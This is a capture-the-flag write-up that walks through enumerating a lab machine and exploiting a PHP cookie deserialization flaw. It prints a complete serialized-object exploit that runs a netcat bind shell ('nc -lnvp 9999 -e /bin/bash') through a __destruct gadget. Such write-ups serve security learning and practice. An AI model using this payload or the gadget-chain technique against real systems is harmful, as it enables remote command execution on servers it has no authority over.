Peace, mercy and blessings of God 
today we are going to solve an interesting ctf from nakerah nakerha.com
 our goal is to read root's flag file 
 expolit will be devided into two missions first deserilization attack then ret2libc
 so with all that being said; let's right jump in !!
 first we have that static page 
 looking aroung source code nothing interested there so let's nmap it
 as we see we have some other ports 
 22 ssh we dont have any creds and it seems to be updated
 25 smtp is filtered so we maybe come back to it later
 80 http we already checked it
 so lets visit port 8080 and see what behind the scene
 just another blank page (: i got bored so let's gobuster it :XD
 
 so we have /backup file seems to be interesting let's dump it
 
 after downloading the file it's php code so let's analyze it
 class exCommand{
        public function __destruct(){
            system($this->command);
        }
    }
here it creates a exCommand class and use a magic method __destruct then pass the value of command propert to system function
Destructor is automatically called and allows you to perform some operations before destroying an object which will be our attack vector
class Hello{
        private $name;
        private $role;
        private $isSet;
        public function check(){
           $this->isSet=isset($_COOKIE['name']);
        }
        
        }
    }
here creating class Hekko with some private vars and check function to verify if there's a cookie name name 
public function printHello(){
            if($this->isSet){
                echo "<br >" . $_COOKIE['name']."<br /><br /><br />";
                echo "Hello " . $this->name . "<br>";
                echo "your role is " . $this->role . "\n";
                echo "<br ><br ><br >";
            }else{
                echo "good";
            }
another function printHello fisrt verify if there's a property isSet it will print our cookie, say hello to our cookie name and print our role but if not it will just print good

$obj = unserialize($_COOKIE['name']);
$obj->check();
$obj->printHello();
at last here it create an var, assign it's value to our deserialized_cookie passing it to check and printHello functions

so to stay focus here it's deserilization attack and we need to pass our command to exCommand funcion which has that magic method
the problem here is that first with exCommand class we used   a property command without identifying it so in our exploit we will have to pass it to our object and  give it a vlaue
second problem is that we have to bypass that cookie checks so let's write our exploit code
the trick here is if we bypass check function it will hust print some staff and if we try to target our exCommand class it will fail with check function so ...
the trick here is we will create exCommand identify command property with a value (our command) put it inside  Hello calss and selialize all that staff together
<?php

    class exCommand{
        public function __destruct(){
            system($this->command);
        }
    }



 class Hello{
        public $name;
        public $role;
        public $isSet;
        public $dummy;
}


$x = new exCommand;
$x->command = "nc -lnvp 9999 -e /bin/bash";


$y = new Hello;
$y->name = "fady";
$y->role = "hacker";
$y->isSet = 1;
$y->dummy = $x;

print serialize($y);
code analysis:

class exCommand{
   public function __destruct(){
   system($this->command);
    }
}
$x = new exCommand;
$x->command = "nc -lnvp 9999 -e /bin/bash";
here we just crete the same exCommand class, create our object and give command property our target command (bind shell)

$y = new Hello;
$y->name = "fady";
$y->role = "hacker";
$y->isSet = 1;
$y->dummy = $x;

print serialize($y);
creating an oject of Hello class assing some values to properties and what interesting here it that dummy propety we gave it a value of our exCommand object and finally serialize all that staff and here is our final serialized data
7
and let's try connect
8
and voila we get our shell fisrt missin completed successfully


 